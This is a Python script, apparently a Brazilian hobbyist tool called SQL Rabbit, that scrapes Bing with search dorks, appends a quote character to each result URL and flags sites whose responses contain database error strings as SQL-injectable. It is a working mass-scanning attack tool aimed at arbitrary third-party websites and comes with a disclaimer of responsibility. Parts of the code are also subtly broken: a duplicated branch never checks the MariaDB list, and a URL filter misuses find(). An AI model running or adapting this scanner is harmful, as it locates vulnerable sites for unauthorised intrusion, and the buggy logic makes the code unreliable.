#/usr/bin/python
# -*- coding:utf-8 -*-
'''

                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.
'''
try:
    import requests
except:
    print('sudo pip3 install requests ou pip3 install requests')
import re
import os
try:
    import string
except:
    print('sudo pip3 install string ou pip3 install string')
import sys
import time
global Animation, fastprint
#from threading import Thread
os.system('clear')
class BitColors():
    vermelho = '\033[31m'
    verde = '\033[32m'
    azul = '\033[34m'
    ciano = '\033[36m'
    magenta = '\033[35m'
    amarelo = '\033[33m'
    preto = '\033[30m'
    branco = '\033[37m'
    original = '\033[0;0m'
    reverso = '\033[2m'    
    default  = '\033[0m'

file = open('urls_Duplicadas.txt', 'w')
file.close()

err_page = 0
good_page = 0


def fastprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(1./50)

def Animation(String):
    animation = "|/-\\"
    for i in range(15):
        time.sleep(0.1)
        sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + BitColors.verde + String)
        sys.stdout.flush()

class Banner():
    Computer = """
  _   _   _     _   _   _   _   _   _  
 / \ / \ / \   / \ / \ / \ / \ / \ / \ 
( S | Q | L ) ( R | a | b | i | t | t )
 \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ \_/ """
print(BitColors.magenta+Banner.Computer)
print('+======================================+')
print('|        Laboratorio Fantasma          |')
print('+======================================+')
print('$$        Coded By > Luth1er          $$')
print('$$         Date: 31/05/2017           $$')
print('$$ I take no responsibilities for the $$')
print('$$      use of this program !         $$')
print('+======================================+')
print('|         SQLi_Scanner_Finder          |')
print('+======================================+')
fastprint(BitColors.magenta+"\t\t               Telegram: @DreadPirateRobertt")
print('')
paginas = int(input(BitColors.magenta+'[+] Numero De Paginas: '))*10
class SQL_Vulns():
    SqlVulns_List = ["mysql_num_rows()","mysql_fetch_array()","Error Occurred While Processing Request","Server Error in '/' Application","Microsoft OLE DB Provider for ODBC Drivers error","error in your SQL syntax","Invalid Querystring",
    "OLE DB Provider for ODBC","VBScript Runtime","ADODB.Field","BOF or EOF","ADODB.Command","JET Database","mysql_fetch_row()",
    "Syntax error","include()","mysql_fetch_assoc()","mysql_fetch_object()","mysql_numrows()","GetArray()","FetchRow()",
    "Input string was not in a correct format","session_start()","array_merge()","preg_match()","ilesize()","filesize()","",
    "SQL Error","[MySQL][ODBC 5.1 Driver][mysqld-4.1.22-community-nt-log]You have an error in your SQL syntax","You have an error in your SQL syntax","mysql_query()","mysql_fetch_object()","Query failed:","Warning include() [function.include]",
    "mysql_num_rows()","Database Query Failed","mysql_fetch_assoc()","mysql_free_result()","Query failed (SELECT * FROM WHERE id = )","num_rows","Error Executing Database Query",
    "Unclosed quotation mark","Error Occured While Processing Request","FetchRows()","Microsoft JET Database","ODBC Microsoft Access Driver","OLE DB Provider for SQL Server","SQLServer JDBC Driver",
    "Error Executing Database Query","ORA-01756","getimagesize()",]
    E_MICROSOFT=["Microsoft JET Database", "ADODB.Recordset", "500 - Internal server error", "Microsoft OLE DB Provider", "Unclosed quotes", "ADODB.Command", "ADODB.Field error", "Microsoft VBScript","Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark", "Microsoft OLE DB Provider for Oracle", "Active Server Pages error", "OLE/DB provider returned message","OLE DB Provider for ODBC", "Unclosed quotation mark after the character string", "SQL Server", "Warning: odbc_"]
    E_ORACLE=["ORA-00921: unexpected end of SQL command", "ORA-01756", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended"]
    E_DB2=["DB2 ODBC", "DB2 error", "DB2 Driver"]
    E_ODBC=["ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver"]
    E_POSTGRESQL=["Warning: pg_", "PostgreSql Error:", "function.pg", "Supplied argument is not a valid PostgreSQL result", "PostgreSQL query failed: ERROR: parser: parse error", ": pg_"]
    E_SYBASE = ["Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "sybase_", "ODBC Driver"]
    E_JBOSSWEB=["java.sql.SQLSyntaxErrorException: ORA-", "org.springframework.jdbc.BadSqlGrammarException:", "javax.servlet.ServletException:", "java.lang.NullPointerException"]
    E_JDBC=["Error Executing Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver"]
    E_JAVA=["java.io.IOException: InfinityDB"]
    E_PHP=["Warning: include", "Fatal error: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include",
    "Disallowed Parent Path", "function.require", "Warning: main", "Warning: session_start\(\)", "Warning: getimagesize\(\)", "Warning: array_merge\(\)", "Warning: preg_match\(\)",
    "GetArray\(\)", "FetchRow\(\)", "Warning: preg_", "Warning: ociexecute\(\)", "Warning: ocifetchstatement\(\)", "PHP Warning:"]
    E_ASP=["Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF",
    "Unclosed quotation mark", "Error converting data type varchar to numeric"]
    E_LUA=["LuaPlayer ERROR:", "CGILua message", "Lua error"]
    E_UNDEFINED=["Incorrect syntax near", "Fatal error", "Invalid Querystring", "Input string was not in a correct format", "An illegal character has been found in the statement"]
    E_MARIADB=["MariaDB server version for the right syntax"]

    All_Vulns = [SqlVulns_List,E_MICROSOFT,E_ORACLE,E_DB2,E_ODBC,E_POSTGRESQL,E_SYBASE,E_JBOSSWEB,E_JDBC,E_JAVA,E_PHP,E_ASP,E_LUA,E_UNDEFINED,E_MARIADB]

def main():
    global Animation, fastprint, paginas
    print('')
    
    file = open('urls_Duplicadas.txt', 'w')
    file.close()
    dorks = open('dorks.txt' , 'r', encoding='utf8')
    dorks_list = dorks.readlines()
    dorks.close() 
    
    def PhantomLab(D13):
        CVZ = set()
        seen_add = CVZ.add
        return [ x for x in D13 if not (x in CVZ or seen_add(x))]

    print(BitColors.azul+'[*] Numero De Dorks: '+str(len(dorks_list)))
    for i in range(len(dorks_list)):
        search = dorks_list[i].strip()
        count = 1
        while (count < paginas):
            req = ('http://www.bing.com/search?q=' + search + '&first='+str(count))
            try:    
                response = requests.get(req)
            except:
                print(BitColors.vermelho+'[!] Erro ao acessar o bing.com')
            req = ''    
            try:
                link = re.findall('<h2><a href="(.+?)"', response.text, re.DOTALL)
                for i in range(len(link)):
                    print(BitColors.ciano + link[i])
                    if link[i].find('http://bs.yandex.ru'):
                        open('urls_Duplicadas.txt', 'a+').write(link[i] +'\'' + '\n')
            except:
                print(BitColors.vermelho+'Error parsing url')
            count = count+10
    #------------------------ Removendo Duplicados -------------------------
    print('')      
    print(BitColors.branco+'[*] Removendo Urls Duplicadas...')
    print('')
    input = open('urls_Duplicadas.txt', 'r')
    output = open('url.txt', 'w')
    linesarray = input.readlines()
    input.close()
    seen = []
    seen = PhantomLab(linesarray)
    for i in range(len(seen)):
        output.write(seen[i])
    os.remove('urls_Duplicadas.txt')
    output.close()
    print('')
    Animation('Completo..')
    Animation('Iniciando Scanner Sqli...')
    print('')

    file = open('url.txt' , 'r')
    url_list = file.readlines()
    file.close()

    err_page = 0
    good_page = 0

    os.system('clear')
    try:
        for i in range(len(url_list)):
            page = url_list[i].strip()
            try:
                response = requests.get(page)
            except:
                err_page = err_page+1
                print(BitColors.vermelho+'Error get page found...')
                #--------------------------
            for i in range(len(SQL_Vulns.All_Vulns)):
                if i == 0:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print(BitColors.verde+'+=============================================+')
                            print(BitColors.verde+'[+] Possivel Pagina Vulneravel:')
                            print(BitColors.verde+'[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print(BitColors.verde+'[+] Database Found: SQlVulns')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))                            
                            print(BitColors.verde+'+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            #URL_Split, space = page.split("'")
                            #sql =  input ('Deseja Abrir target no SqlMap ? (n/Y) > ')
                            #if sql == 'y'.lower():
                                #SQL_Thread = Thread(target=Sql_Injection, args=[URL_Split])
                                #SQL_Thread.start()
                            break;
                        else:
                            pass
                elif i == 1:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_Microsoft')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass
                elif i == 2:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_ORACLE')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass

                elif i == 3:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_DB2')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass
                elif i == 4:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_ODBC')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass
                elif i == 5:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_POSTGRESQL')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass

                elif i == 6:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_SYBASE')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass

                elif i == 7:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_JBOSSWEB')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass


                elif i == 8:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_JDBC')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass


                elif i == 9:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_JAVA')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass


                elif i == 10:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_PHP')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass


                elif i == 11:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_ASP')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass


                elif i == 12:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_LUA')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass


                elif i == 13:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_UNDEFINED')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass

                elif i == 13:
                    for error in SQL_Vulns.All_Vulns[i]:
                        if response.text.find(error)>0:
                            print('+=============================================+')
                            print('[+] Possivel Pagina Vulneravel:')
                            print('[+] SQL_Error: {}'.format(BitColors.azul+error))
                            print('[+] Database Found: E_MARIADB')
                            print(BitColors.verde+'[+] Site: {}'.format(BitColors.azul+page))
                            print('+=============================================+')
                            open('good.txt', 'a+').write(page + '\n')
                            good_page = good_page + 1
                            break;
                        else:
                            pass

        print('')
        Animation("Scaneamento Concluido com Sucesso...")
        print('')
        print(BitColors.amarelo+'Total De Paginas Vulneraveis: '+str(good_page))
        print('')
        print(BitColors.ciano+'[404] - Pages not Found: '+BitColors.vermelho+str(err_page))
        print('')
    except KeyboardInterrupt:
        print(BitColors.vermelho+"\n [!] Exiting.....")
        exit()

if __name__ == '__main__':
    main()      


